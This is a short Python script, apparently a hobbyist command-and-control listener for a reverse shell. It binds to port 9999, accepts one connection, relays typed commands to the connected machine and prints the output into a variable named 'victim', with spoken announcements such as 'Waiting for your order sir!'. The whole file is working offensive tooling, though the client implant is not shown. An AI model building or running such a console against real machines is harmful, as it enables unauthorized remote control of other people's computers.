# -------------------------------------------------------------------------------------------------#
import socket   #Let her connect to other IP
import sys      #Let her full control of the code
import pyttsx3

# -------------------------------------------------------------------------------------------------#
engine = pyttsx3.init()
voices = engine.getProperty('voices')
engine.setProperty('voice', voices[1].id)

# -------------------------------------------------------------------------------------------------#

def Speak_Function(text):
    engine.say(text)
    engine.runAndWait()

# -------------------------------------------------------------------------------------------------#
#First i will create a socket to connect with client
def create_a_new_socket():
    try:
        global HOST
        global PORT
        global s
        HOST = ""
        PORT = 9999
        s = socket.socket()

    except socket.error as error:
        Speak_Function("We have a problem sir! I can't create a new socket")
        print("Fail to create a new socket: " + str(error))

# -------------------------------------------------------------------------------------------------#
#I will use that socket to listen to client
def binding_socket():
    try:
        global HOST
        global PORT
        global s
        print("Waiting for the connection of the Port: " + str(PORT))

        s.bind((HOST, PORT))
        s.listen(5)

    except socket.error as error:
        Speak_Function("We have a problem Sir! I can't connect the HOST")
        Speak_Function(str(error))

        Speak_Function("Retrying connect to the HOST:" + str(PORT))
        binding_socket()

# -------------------------------------------------------------------------------------------------#
#When Client accept my socket, i will send command
def socket_accepted():
    connection, address  = s.accept()
    print( " IP " + address[0] + " | Port" + str(address[1]))

    Speak_Function("Connection Complete")
    Speak_Function("Waiting for your order sir!")

    sending_commands(connection)
    connection.close()

# -------------------------------------------------------------------------------------------------#
#Create a function to write command and send to client
def sending_commands(connection):
    while True:
        terminal = input()

        if terminal == 'quit' or terminal == "exit" or terminal == "close":
            Speak_Function("Understood Sir! Close all connections")
            connection.close()

            Speak_Function("All connections have closed! Close the Socket")
            s.close()

            Speak_Function("Socket has closed! Exit the system")
            sys.exit()

        if len(str.encode(terminal)) > 0:
            connection.send(str.encode(terminal))
            victim = str(connection.recv(1024) ,"utf-8")
            print(victim, end="")

# -------------------------------------------------------------------------------------------------#

def main():
    create_a_new_socket()
    binding_socket()
    socket_accepted()

# -------------------------------------------------------------------------------------------------#


